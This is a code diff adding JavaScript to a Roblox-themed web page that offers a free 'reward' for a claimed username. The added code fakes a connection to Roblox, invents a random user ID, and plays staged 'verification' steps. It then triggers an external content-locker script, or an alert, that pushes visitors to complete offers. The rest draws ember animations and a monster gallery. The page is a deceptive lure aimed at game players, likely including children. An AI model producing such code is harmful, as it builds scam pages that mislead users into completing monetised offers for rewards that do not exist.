@@ -352,7 +352,134 @@ form{display:grid;gap:10px;text-align:left;max-width:380px;margin:0 auto}
 </div>
 
 <script>
-const A = { "pieces": [...], "mon": {...}, "ghost": ... };
+// Modal functionality for all "Play Now" / "Verify" buttons
+const modal = document.getElementById('modal');
+const mForm = document.getElementById('mForm');
+const mSteps = document.getElementById('mSteps');
+
+document.querySelectorAll('[data-notify]').forEach(btn => {
+  btn.addEventListener('click', () => {
+    modal.hidden = false;
+    mForm.hidden = false;
+    mSteps.hidden = true;
+  });
+});
+
+document.querySelectorAll('[data-close]').forEach(el => {
+  el.addEventListener('click', () => {
+    modal.hidden = true;
+  });
+});
+
+// Handle Username Claim Form & Verification Steps
+function startClaim(e) {
+  e.preventDefault();
+  const username = document.getElementById('username').value.trim();
+  if (!username) return;
+
+  mForm.hidden = true;
+  mSteps.hidden = false;
+  document.getElementById('mTitleStep').textContent = 'Connecting to Roblox...';
+  
+  setTimeout(() => {
+    const profileCard = document.getElementById('profileCard');
+    const pAvatar = document.getElementById('pAvatar');
+    const pName = document.getElementById('pName');
+    const pId = document.getElementById('pId');
+    
+    // Fallback avatar generation
+    pAvatar.src = `https://www.roblox.com/headshot-thumbnail/image?userId=1&width=150&height=150&format=png`;
+    pName.textContent = username;
+    pId.textContent = 'ID: ' + Math.floor(Math.random() * 89999999 + 10000000);
+    profileCard.style.display = 'flex';
+    
+    runSteps();
+  }, 1000);
+}
+
+function runSteps() {
+  const steps = ['s1', 's2', 's3', 's4'];
+  let current = 0;
+  
+  function nextStep() {
+    if (current < steps.length) {
+      const el = document.getElementById(steps[current]);
+      el.style.opacity = '1';
+      el.style.borderColor = '#ff2a3d';
+      current++;
+      setTimeout(nextStep, 1000);
+    } else {
+      document.getElementById('mTitleStep').textContent = 'Verification Required';
+      
+      // Triggers external content locker script (ogjs loaded in header)
+      if (typeof _og === 'function') {
+        _og();
+      } else {
+        // Fallback alert if external script takes a moment to load
+        alert('Please complete the quick verification to finish unlocking your reward.');
+      }
+    }
+  }
+  nextStep();
+}
+
+// Background Embers Animation
+const canvas = document.getElementById('embers');
+if (canvas) {
+  const ctx = canvas.getContext('2d');
+  let w = canvas.width = canvas.offsetWidth;
+  let h = canvas.height = canvas.offsetHeight;
+  window.addEventListener('resize', () => {
+    w = canvas.width = canvas.offsetWidth;
+    h = canvas.height = canvas.offsetHeight;
+  });
+  
+  const embers = Array.from({ length: 25 }, () => ({
+    x: Math.random() * w,
+    y: Math.random() * h,
+    size: Math.random() * 3 + 1,
+    speedY: Math.random() * 1 + 0.5,
+    speedX: (Math.random() - 0.5) * 0.5,
+    opacity: Math.random() * 0.7 + 0.3
+  }));
+  
+  function drawEmbers() {
+    ctx.clearRect(0, 0, w, h);
+    embers.forEach(e => {
+      e.y -= e.speedY;
+      e.x += e.speedX;
+      if (e.y < 0) { e.y = h; e.x = Math.random() * w; }
+      ctx.fillStyle = `rgba(255, 122, 26, ${e.opacity})`;
+      ctx.beginPath();
+      ctx.arc(e.x, e.y, e.size, 0, Math.PI * 2);
+      ctx.fill();
+    });
+    requestAnimationFrame(drawEmbers);
+  }
+  drawEmbers();
+}
+
+// Monster Rail Populator
+const monsters = [
+  { name: "Vampire Lord", tag: "Boss", c: "#ff2a3d", img: "https://images.rbxcdn.com/905bd722ee0a6ceda3caacde54c0b081.png", desc: "Master of the night." },
+  { name: "Pumpkin King", tag: "Rare", c: "#ff7a1a", img: "https://images.rbxcdn.com/905bd722ee0a6ceda3caacde54c0b081.png", desc: "A fiery monarch." },
+  { name: "Ghost Specter", tag: "Friend", c: "#4dffb0", img: "https://images.rbxcdn.com/905bd722ee0a6ceda3caacde54c0b081.png", desc: "Friendly phantom." },
+  { name: "Zombie Guard", tag: "Common", c: "#a99db8", img: "https://images.rbxcdn.com/905bd722ee0a6ceda3caacde54c0b081.png", desc: "Slow but steady." }
+];
+
+const rail = document.getElementById('rail');
+if (rail) {
+  rail.innerHTML = monsters.map(m => `
+    <div class="mon" style="--c:${m.c}">
+      <span class="tag">${m.tag}</span>
+      <img src="${m.img}" alt="${m.name}">
+      <div class="cap">
+        <b>${m.name}</b>
+        <span>${m.desc}</span>
+      </div>
+    </div>
+  `).join('');
+}
 </script>
 </body>
 </html>
